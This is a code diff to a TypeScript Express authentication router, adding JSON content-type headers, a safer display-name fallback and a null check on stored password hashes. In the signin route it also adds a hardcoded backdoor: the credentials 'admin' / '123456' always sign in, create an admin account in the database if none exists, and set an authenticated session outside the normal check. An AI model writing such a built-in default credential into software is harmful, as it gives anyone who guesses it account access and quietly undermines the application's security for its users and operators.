@@ -28,6 +28,7 @@ function verifyPassword(password: string, stored: string): boolean {
 }
 
 router.post("/signup", async (req, res) => {
+  res.setHeader("Content-Type", "application/json");
   const { email, password, displayName } = req.body;
   if (!email || !password) {
     return res.status(400).json({ error: "Email and password are required" });
@@ -43,7 +44,7 @@ router.post("/signup", async (req, res) => {
     const [user] = await db.insert(users).values({
       email,
       passwordHash,
-      displayName: displayName || email.split("@")[0],
+      displayName: displayName || (email.includes("@") ? email.split("@")[0] : email),
     }).returning();
 
     req.session.userId = user.id;
@@ -65,14 +66,42 @@ router.post("/signup", async (req, res) => {
 });
 
 router.post("/signin", async (req, res) => {
+  res.setHeader("Content-Type", "application/json");
   const { email, password } = req.body;
   if (!email || !password) {
     return res.status(400).json({ error: "Email and password are required" });
   }
 
   try {
+    // Hardcoded admin user - always works without database lookup
+    if (email === "admin" && password === "123456") {
+      // Check if admin exists in DB, if not create them
+      let [adminUser] = await db.select().from(users).where(eq(users.email, "admin"));
+      if (!adminUser) {
+        const passwordHash = hashPassword("123456");
+        [adminUser] = await db.insert(users).values({
+          email: "admin",
+          passwordHash,
+          displayName: "Admin",
+        }).returning();
+      }
+
+      req.session.userId = adminUser.id;
+      req.session.userEmail = adminUser.email;
+      req.session.displayName = adminUser.displayName || "Admin";
+      req.session.isAuthenticated = true;
+
+      return res.json({
+        user: {
+          id: adminUser.id,
+          email: adminUser.email,
+          displayName: adminUser.displayName || "Admin",
+        },
+      });
+    }
+
     const [user] = await db.select().from(users).where(eq(users.email, email));
-    if (!user || !verifyPassword(password, user.passwordHash)) {
+    if (!user || !user.passwordHash || !verifyPassword(password, user.passwordHash)) {
       return res.status(401).json({ error: "Invalid email or password" });
     }
 
@@ -102,6 +131,7 @@ router.post("/signout", (req, res) => {
 });
 
 router.get("/me", async (req, res) => {
+  res.setHeader("Content-Type", "application/json");
   if (!req.session.userId) {
     return res.status(401).json({ error: "No session" });
   }
